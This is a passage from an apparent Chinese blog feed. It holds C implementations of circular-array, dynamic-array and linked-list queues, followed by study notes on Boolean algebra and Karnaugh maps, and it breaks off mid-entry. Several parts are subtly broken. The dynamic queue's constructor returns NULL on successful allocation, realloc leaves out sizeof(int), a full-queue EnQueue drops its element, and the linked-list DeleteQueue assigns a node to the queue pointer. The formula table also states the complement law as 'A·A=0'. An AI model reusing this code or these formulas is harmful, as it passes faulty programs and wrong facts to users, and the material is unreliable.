class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">Q-&gt;<span class="built_in">array</span>[Q-&gt;rear] = data;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == <span class="number">-1</span>) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> data = <span class="number">0</span>;<span class="comment">//或者为Q中不存在的元素值</span></span><br><span class="line"><span class="keyword">if</span> (IsEmptyQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue is empty!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">data = Q-&gt;<span class="built_in">array</span>[Q-&gt;front];</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;<span class="comment">//对应队列中仅有一个元素的情况，删除后为空队列</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q) &#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="built_in">free</span>(Q-&gt;<span class="built_in">array</span>);</span><br><span class="line"><span class="built_in">free</span>(Q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>局限性：队列的最大长度需要事先定义且不能更改，EnQueue满队时会产生满队异常。</p><h3 id="基于动态循环数组的实现"><a class="markdownIt-Anchor" href="#基于动态循环数组的实现"></a> 基于动态循环数组的实现</h3><p>动态循环数组的实现和简单循环数组大致相同，唯一的区别是加入了一个ResizeQueue函数用来调整预设循环数组的大小，代码如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span> &#123;</span></span><br><span class="line"><span class="type">int</span> front, rear;</span><br><span class="line"><span class="type">int</span> capacity;</span><br><span class="line"><span class="type">int</span>* <span class="built_in">array</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ArrayQueue* <span class="title function_">Queue</span><span class="params">(<span class="type">int</span> size)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ArrayQueue</span>* <span class="title">Q</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ArrayQueue));</span><br><span class="line"><span class="keyword">if</span> (!Q)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//如果创建内存失败，返回空</span></span><br><span class="line">Q-&gt;capacity = size;<span class="comment">//初始化队列的容量</span></span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;</span><br><span class="line">Q-&gt;<span class="built_in">array</span> = <span class="built_in">malloc</span>(Q-&gt;capacity * <span class="keyword">sizeof</span>(<span class="type">int</span>));<span class="comment">//申请一片内存作为数组，来储存队列元素</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;<span class="comment">//假如数组申请失败，则返回空</span></span><br><span class="line"><span class="keyword">return</span> Q;<span class="comment">//返回初始化成功的队列数据对象</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(Q-&gt;front == <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsFullQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>((Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity == Q-&gt;front);<span class="comment">//如果队尾位置后即为队首说明队满</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">QueueSize</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (Q-&gt;capacity - Q-&gt;front + Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (IsFullQueue(Q)) &#123;</span><br><span class="line">ResizeQueue(Q);<span class="comment">//扩大数组，调整大小</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">Q-&gt;rear = (Q-&gt;rear + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">Q-&gt;<span class="built_in">array</span>[Q-&gt;rear] = data;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == <span class="number">-1</span>) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ResizeQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> size = Q-&gt;capacity;</span><br><span class="line">Q-&gt;capacity = Q-&gt;capacity * <span class="number">2</span>;</span><br><span class="line">Q-&gt;<span class="built_in">array</span> = <span class="built_in">realloc</span>(Q-&gt;<span class="built_in">array</span>, Q-&gt;capacity);<span class="comment">//realloc函数会自动将原内存数据复制到一片新申请的空间上</span></span><br><span class="line"><span class="keyword">if</span> (!Q-&gt;<span class="built_in">array</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Memory Error&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front &gt; Q-&gt;rear) &#123;</span><br><span class="line"><span class="comment">//如果此时尾指针在首指针前，也就是队尾循环回到了队尾</span></span><br><span class="line"><span class="comment">//但是作为一维数组来看，表现为队首指针到数组起点存在元素</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Q-&gt;front; i++)</span><br><span class="line">&#123;</span><br><span class="line">Q-&gt;<span class="built_in">array</span>[i + size] = Q-&gt;<span class="built_in">array</span>[i];</span><br><span class="line">&#125;</span><br><span class="line">Q-&gt;rear = Q-&gt;rear + size;</span><br><span class="line"><span class="comment">//即把拓展后的循环数列“展开”，重新将尾指针移向头指针后</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> data = <span class="number">0</span>;<span class="comment">//或者为Q中不存在的元素值</span></span><br><span class="line"><span class="keyword">if</span> (IsEmptyQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue is empty!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">data = Q-&gt;<span class="built_in">array</span>[Q-&gt;front];</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == Q-&gt;rear) &#123;</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="number">-1</span>;<span class="comment">//对应队列中仅有一个元素的情况，删除后为空队列</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> Q-&gt;front = (Q-&gt;front + <span class="number">1</span>) % Q-&gt;capacity;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteQueue</span><span class="params">(<span class="keyword">struct</span> ArrayQueue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (Q) &#123;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;<span class="built_in">array</span>)</span><br><span class="line"><span class="built_in">free</span>(Q-&gt;<span class="built_in">array</span>);</span><br><span class="line"><span class="built_in">free</span>(Q);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于链表的实现-2"><a class="markdownIt-Anchor" href="#基于链表的实现-2"></a> 基于链表的实现</h3><p>实现队列的另一种途径是利用链表。EnQueue操作可以通过在链表表尾插入元素实现，而DeQueue则可以通过删除链表首元素实现。</p><p>代码实现如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:6031)</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;<span class="comment">//定义了一个节点</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">front</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">rear</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Queue* <span class="title function_">CreatQueue</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Queue</span>* <span class="title">Q</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span></span><br><span class="line">Q = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Queue));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Q) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">temp = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">Q-&gt;front = Q-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> Q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">IsEmptyQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q)</span> &#123;</span><br><span class="line"><span class="keyword">return</span>(Q-&gt;front == <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">EnQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q, <span class="type">int</span> data)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">newNode</span>;</span></span><br><span class="line">newNode = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line"><span class="keyword">if</span> (!newNode)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">newNode-&gt;data = data;</span><br><span class="line">newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (Q-&gt;rear)Q-&gt;rear-&gt;next = newNode;</span><br><span class="line">Q-&gt;rear = newNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Q-&gt;front == <span class="literal">NULL</span>)</span><br><span class="line">Q-&gt;front = Q-&gt;rear;<span class="comment">//插入时队列为空的情况</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">DeQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q)</span> &#123;</span><br><span class="line"><span class="type">int</span> data = <span class="number">0</span>;<span class="comment">//或者队列中不存在的元素</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">temp</span>;</span></span><br><span class="line"><span class="keyword">if</span> (IsEmptyQueue(Q)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Queue is empty!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">temp = Q-&gt;front;</span><br><span class="line">data = Q-&gt;front-&gt;data;</span><br><span class="line">Q-&gt;front = Q-&gt;front-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteQueue</span><span class="params">(<span class="keyword">struct</span> Queue* Q)</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">temp</span>;</span></span><br><span class="line"><span class="keyword">while</span> (Q-&gt;front) &#123;</span><br><span class="line">temp = Q-&gt;front;</span><br><span class="line">Q = Q-&gt;front-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(temp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(Q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完结咯(๑′ᴗ‵๑)Ｉ Lᵒᵛᵉᵧₒᵤ❤</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/92133366_p0.png" alt="92133366_p0" /></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈 </tag>
            
            <tag> 队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑小结（二）——逻辑电路基础</title>
      <link href="/posts/79f1a0439078/"/>
      <url>/posts/79f1a0439078/</url>
      
        <content type="html"><![CDATA[<h1 id="逻辑电路基础"><a class="markdownIt-Anchor" href="#逻辑电路基础"></a> 逻辑电路基础</h1><h2 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h2><h3 id="逻辑-二值逻辑-逻辑运算-逻辑代数"><a class="markdownIt-Anchor" href="#逻辑-二值逻辑-逻辑运算-逻辑代数"></a> 逻辑、二值逻辑、逻辑运算、逻辑代数</h3><ol><li>逻辑：事物间的因果关系</li><li>二值逻辑：只有两种逻辑关系称为二值逻辑</li><li>逻辑运算：逻辑状态按照某种指定的因果关系进行推理运算</li><li>逻辑代数：按照一定逻辑工具进行运算的代数，是分析和设计数字电路的数学工具</li></ol><h3 id="与普通代数的区别"><a class="markdownIt-Anchor" href="#与普通代数的区别"></a> 与普通代数的区别</h3><p>普通代数可以取任何值，并运用加减乘除进行运算。</p><p>但是逻辑运算仅可取0和1，并且采用与、或、非进行运算。</p><h3 id="与-或-非"><a class="markdownIt-Anchor" href="#与-或-非"></a> 与、或、非</h3><p>与：<em>Y=A·B</em></p><p>或：<em>Y=A+B</em></p><p>非：<em>Y=A’</em></p><h2 id="复合逻辑运算"><a class="markdownIt-Anchor" href="#复合逻辑运算"></a> 复合逻辑运算</h2><p>与非，或非、</p><p>与或非：<em>(AB+CD)’</em></p><p>异或：<em>A’B+AB’</em></p><p>同或：<em>AB+A’B’</em></p><h3 id="基本公式"><a class="markdownIt-Anchor" href="#基本公式"></a> 基本公式</h3><table><thead><tr><th></th><th>公式</th><th></th><th></th><th>公式</th></tr></thead><tbody><tr><td>1</td><td><em>0·A=0</em></td><td>常量与变量的关系</td><td>11</td><td><em>1+A=1</em></td></tr><tr><td>2</td><td><em>1·A=A</em></td><td>常量与变量的关系</td><td>12</td><td><em>0+A=A</em></td></tr><tr><td>3</td><td><em>A·A=A</em></td><td>重叠律</td><td>13</td><td><em>A+A=A</em></td></tr><tr><td>4</td><td><em>A·A=0</em></td><td>互补律</td><td>14</td><td><em>A+A’=1</em></td></tr><tr><td>5</td><td><em>A·B=B·A</em></td><td>交换律</td><td>15</td><td><em>A+B=B+A</em></td></tr><tr><td>6</td><td><em>A·(B·C)=(A·B)·C</em></td><td>结合律</td><td>16</td><td><em>A+(B+C)=(A+B)+C</em></td></tr><tr><td>7</td><td><em>A·(B+C)=A·B+A·C</em></td><td>分配律</td><td>17</td><td>A+B·C=(A+B)·(A+C)</td></tr><tr><td><strong>8</strong></td><td><em><strong>(A·B)‘=A’+B’</strong></em></td><td><strong>摩根定理</strong></td><td><strong>18</strong></td><td><strong>(A+B)‘=A’·B’</strong></td></tr><tr><td>9</td><td><em>(A’)'=A</em></td><td>还原律</td><td></td><td></td></tr><tr><td>10</td><td><em>1’=0;   0’=1</em></td><td></td><td></td><td></td></tr></tbody></table><h3 id="常用公式"><a class="markdownIt-Anchor" href="#常用公式"></a> 常用公式</h3><p><em>A+AB=A</em></p><p><em><strong>A+A’B=A+B</strong></em>…②</p><p><em>AB+AB’=A</em></p><p><em>A(A+B)=A</em></p><p><em><strong>AB+A’C+BC=AB+A’C</strong></em> #若两个乘积项的因子刚好互补，那么他们剩余因子构成的乘积是多余的。</p><p>关于②的推导，在*(A+B)<em>的这边乘上一个</em>(A+A’)*进行化简，有</p><p><em>(A+B)·(A+A’)=A·A+A·A’+BA+BA’=A+AB</em></p><h2 id="逻辑代数的基本定理"><a class="markdownIt-Anchor" href="#逻辑代数的基本定理"></a> 逻辑代数的基本定理</h2><h3 id="代入规则主要应用于公式的推广"><a class="markdownIt-Anchor" href="#代入规则主要应用于公式的推广"></a> 代入规则——主要应用于公式的推广</h3><p>在任何一个包含相同变量的逻辑等式中，如果以另外一个函数代入式中所有该变量的位置，则等式仍成立。类似于换元法，往往应用于定义的推广。</p><p>例如：摩根定理的推广</p><p><em>(A+B)‘=A’·B’  --&gt;  (A+B+C)‘=A’·(B+C)‘=A’B’C’</em></p><h3 id="反演规则主要用于求函数的反函数"><a class="markdownIt-Anchor" href="#反演规则主要用于求函数的反函数"></a> 反演规则——主要用于求函数的反函数</h3><ol><li>把01互换，·+互换，原变量和反变量互换</li><li>先括号，然后乘，最后加</li><li>不是单个引号上的反号要保留</li></ol><p>例如：<em>Y=A·(B+C’)'+A’D</em></p><p>​   <em>Y’=(A’+(B’·C’))·(A+D’)</em></p><h3 id="对偶规则主要用于公式的推广"><a class="markdownIt-Anchor" href="#对偶规则主要用于公式的推广"></a> 对偶规则——主要用于公式的推广</h3><p>即将01互换，·+互换。</p><p>若两逻辑式相等，则他们对偶式相等。</p><h2 id="逻辑函数的表示方法"><a class="markdownIt-Anchor" href="#逻辑函数的表示方法"></a> 逻辑函数的表示方法</h2><ol><li>真值表</li><li>逻辑代数式</li><li>逻辑图</li><li>波形图</li></ol><h3 id="各种表示方法的相互转化"><a class="markdownIt-Anchor" href="#各种表示方法的相互转化"></a> 各种表示方法的相互转化</h3><h4 id="从真值表写逻辑函数式"><a class="markdownIt-Anchor" href="#从真值表写逻辑函数式"></a> 从真值表写逻辑函数式</h4><ul><li>找出真值表中使函数为1的那些输入变量取值的总和</li><li>每组取值组合对应一个乘积项，取值为1的写入原变量，取值为0的写入反变量</li><li>将这些乘积项相加得到目标函数</li><li>如果取值为1的情况过多，可以先求逻辑表达式的反函数，然后将取0的情况按照上述规则写出，最后由反演定理求出原函数。</li></ul><h4 id="逻辑式列真值表"><a class="markdownIt-Anchor" href="#逻辑式列真值表"></a> 逻辑式列真值表</h4><p>将所有变量的取值组合写出然后代入计算即可</p><h4 id="逻辑式画逻辑图"><a class="markdownIt-Anchor" href="#逻辑式画逻辑图"></a> 逻辑式画逻辑图</h4><p>略，好扯淡……</p><h4 id="逻辑图写逻辑函数式"><a class="markdownIt-Anchor" href="#逻辑图写逻辑函数式"></a> 逻辑图写逻辑函数式</h4><p>这个也略……感觉不是很重要……</p><h4 id="逻辑函数式画波形图"><a class="markdownIt-Anchor" href="#逻辑函数式画波形图"></a> 逻辑函数式画波形图</h4><p>对于给定的函数式，我们要遍历给出的所有变量组合，也就是要给出2<sup>n</sup>种情况（n为变量个数）。然后在最底部给出由函数式计算的结果并画图。</p><h4 id="由波形图写逻辑函数式"><a class="markdownIt-Anchor" href="#由波形图写逻辑函数式"></a> 由波形图写逻辑函数式</h4><p>由波形图可以得到所有变量的组合和运算值，将结果列出得到真值表，后续步骤参考真值表转化为逻辑函数式操作。</p><h2 id="逻辑函数的标准形式"><a class="markdownIt-Anchor" href="#逻辑函数的标准形式"></a> 逻辑函数的标准形式</h2><h3 id="最小项和最大项"><a class="markdownIt-Anchor" href="#最小项和最大项"></a> 最小项和最大项</h3><h4 id="最小项的定义"><a class="markdownIt-Anchor" href="#最小项的定义"></a> 最小项的定义</h4><p>在n变量逻辑函数中，若m为包含n个因子的乘积项，而这n个变量在乘积项中均以原变量或者反变量的形式出现且仅出现一次，那么m称作该组变量的<strong>最小项</strong></p><p>如给定变量<em>A、B、C</em>，乘积项*ABC’*是一个最小项</p><p>比如<em>F(A,B)=AB+A’B+AB’+A’B’=m<sub>3</sub>+m<sub>1</sub>+m<sub>2</sub>+m<sub>0</sub>=∑m<sub>i</sub>(i=0~3)</em></p><h4 id="最小项的编号表示方法"><a class="markdownIt-Anchor" href="#最小项的编号表示方法"></a> 最小项的编号表示方法</h4><p>将最小项中的原变量用1表示，反变量用0表示，得到的二进制数转为十进制后对应的编码即为该最小项的编号。</p><p>最小项的起始编码为0，取值范围为0~2<sup>n-1</sup>。记作m<sub>i</sub>。</p><h4 id="最大项的定义"><a class="markdownIt-Anchor" href="#最大项的定义"></a> 最大项的定义</h4><p>在n变量逻辑函数中，若M为包含n个因子的和项，而这n个变量在和项中均以原变量或者反变量的形式出现且仅出现一次，那么M称作该组变量的<strong>最大项</strong></p><h4 id="最大项的编号表示方法"><a class="markdownIt-Anchor" href="#最大项的编号表示方法"></a> 最大项的编号表示方法</h4><p>编号方法与最小值相同，记为M<sub>i</sub>。</p><h4 id="最小项和最大项的性质"><a class="markdownIt-Anchor" href="#最小项和最大项的性质"></a> 最小项和最大项的性质</h4><p><strong>相邻性</strong>：若两个最小项/最大项只有一个因子不同，则称他们具有相邻性。</p><p>对于最小项，相邻的两个最小项相加可以合并成一项，并消去差异因子。</p><p>对于最大项，相邻的两个最大项相乘可以合并成一项，并消去差异因子。</p><h3 id="逻辑函数的最小项之和形式标准与或式"><a class="markdownIt-Anchor" href="#逻辑函数的最小项之和形式标准与或式"></a> 逻辑函数的“最小项之和”形式/标准与或式</h3><p>全部由最小项构成的“积之和”表达式，称为最小项表达式。</p><p>任何逻辑函数都能化成一个<strong>唯一的</strong>标准与或式。</p><h3 id="逻辑函数的最大项之和形式标准或与式"><a class="markdownIt-Anchor" href="#逻辑函数的最大项之和形式标准或与式"></a> 逻辑函数的“最大项之和”形式/标准或与式</h3><p>全部由最大项构成的“和之积”表达式，称为最大项表达式。</p><p>任何逻辑函数都能化成一个<strong>唯一的</strong>标准或与式。</p><h3 id="标准或与式和标准与或式的关系"><a class="markdownIt-Anchor" href="#标准或与式和标准与或式的关系"></a> 标准或与式和标准与或式的关系</h3><p>M<sub>i</sub>=m<sub>i</sub>’。</p><p>由此可知，如果函数式可以由最小项之和表示，那么它一定也能由最大项之积来表示，它们两者是等价的。</p><h2 id="逻辑函数的化简方法"><a class="markdownIt-Anchor" href="#逻辑函数的化简方法"></a> 逻辑函数的化简方法</h2><p>通过反复使用逻辑函数的运算公式来化简。</p><p>关于化最简的标准，其实要根据实际应用中提供的逻辑器件来决定。以使用电子器件数目最少，成本最低为判断最简的标准。默认最简形式为与或式，即只用与门和或门来实现电路。</p><p>最简与或式要求式子中与项数目最少，且乘积项中包含的变量数目最少。</p><h3 id="常用的公式化简方法"><a class="markdownIt-Anchor" href="#常用的公式化简方法"></a> 常用的公式化简方法</h3><h3 id="卡诺图化简法"><a class="markdownIt-Anchor" href="#卡诺图化简法"></a> 卡诺图化简法</h3><p>卡诺图的思想源于两个相邻的最小项可以化简。</p><h4 id="认识卡诺图"><a class="markdownIt-Anchor" href="#认识卡诺图"></a> 认识卡诺图</h4><p>将n变量的全部最小项各用一个小方格表示，并且使具有逻辑相邻性的最小项在几何位置上也相邻的排列起来，所得到的图形叫做<strong>n变量卡诺图</strong></p><h4 id="怎么用卡诺图表示逻辑函数"><a class="markdownIt-Anchor" href="#怎么用卡诺图表示逻辑函数"></a> 怎么用卡诺图表示逻辑函数</h4><p>注意循环码，即变量之间的排序两两之间只有一位发生了变化，而不是递增排序。</p><p>卡诺图一般画成正方形或矩形。</p><p>在卡诺图中，凡是几何相邻的最小项，在逻辑上都是相邻的。</p><p>相接：紧挨着；相对：任意一行或一列的两头；相重：对折之后位置相重</p><h4 id="逻辑函数写卡诺图"><a class="markdownIt-Anchor" href="#逻辑函数写卡诺图"></a> 逻辑函数写卡诺图</h4><ul><li>首先把画出一个正方形或矩形表格，n变量的卡诺图有2<sup>n</sup>个小方格。</li><li>然后把变量分为两组，如AB/CD。</li><li>按循环码循环给变量取值排序。比如00、01、11、10。</li><li>随后根据逻辑函数填表，若逻辑函数不是标准与或式则化为标准与或式。在逻辑函数包含的最小项在卡诺图对应的方格填1，其余填0（一般省略0）</li><li>在卡诺图中几何相邻的最小项可以合并为一项并消去相异因子，从而达到化简的目的。</li><li>注意，上述<strong>几何相邻</strong>的意义为相邻、对折相邻、上下角相邻，左右角相邻。</li><li>将所有相邻的1圈起来，圈越大越好；一个方格可以被多个圈入，但必须要有新的1在圈内，否则该圈为多余。</li><li>当0比较多的时候，也可以选择将所有0圈起来写出Y’，再取反得到答案。</li></ul><h2 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h2><p>这节内容主要介绍了一些逻辑运算的方法，以及一些运算规则和化简方法。</p><p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/301684.jpg" alt="301684" /></p>]]></content>
      
      
      <categories>
          
          <category> 课堂随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字逻辑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑小结（一）——数制基础</title>
      <link href="/posts/3077fdcc251d/"/>
      <url>/posts/3077fdcc251d/</url>
      
        <content type="html"><![CDATA[<h1 id="数制"><a class="markdownIt-Anchor" href="#数制"></a> 数制</h1><h2 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h2><p>数字系统中的各种信号以<strong>数码</strong>形式给出</p><p>数码包括：数量大小、不同的事物</p><p>其中数量大小和<strong>数制</strong>有关：十进制、二进制、八进制、十六进制等</p><p>不同的事物和<strong>编码形式</strong>有关：ASCII码等</p><h3 id="十进制"><a class="markdownIt-Anchor" href="#十进制"></a> 十进制</h3><ul><li>每一位的构成：0~9</li><li>进位规则：逢十进一</li></ul><p>如（209.04）<sub>10</sub>=2×10<sup>2</sup>+0×10<sup>1</sup>+9×10<sup>0</sup>+0×10<sup>-1</sup>+4×10<sup>-2</sup></p><p>各位数的权是10的幂</p><h3 id="二进制"><a class="markdownIt-Anchor" href="#二进制"></a> 二进制</h3><ul><li>构成：0、1</li><li>进位规则：逢二进一</li></ul><p>各位数的权是2的幂</p><h3 id="八进制"><a class="markdownIt-Anchor" href="#八进制"></a> 八进制</h3><ul><li>构成：0~7</li><li>进位规则：逢八进一</li></ul><h3 id="十六进制"><a class="markdownIt-Anchor" href="#十六进制"></a> 十六进制</h3><ul><li>构成：0-9、A-F</li><li>进位规则：逢十六进一</li></ul><h2 id="数制转换"><a class="markdownIt-Anchor" href="#数制转换"></a> 数制转换</h2><h3 id="二进制转八进制"><a class="markdownIt-Anchor" href="#二进制转八进制"></a> 二进制转八进制</h3><p>将二进制数由小数点开始，整数部分向左，小数部分向右，每3位一组，不够三位补零，则每组二进制数就是一位八进制数。<strong>“3对1”</strong></p><h3 id="八进制转二进制"><a class="markdownIt-Anchor" href="#八进制转二进制"></a> 八进制转二进制</h3><p>即将每一位八进制数用3位二进制数表示。<strong>“1对3”</strong></p><h3 id="二进制转十六进制"><a class="markdownIt-Anchor" 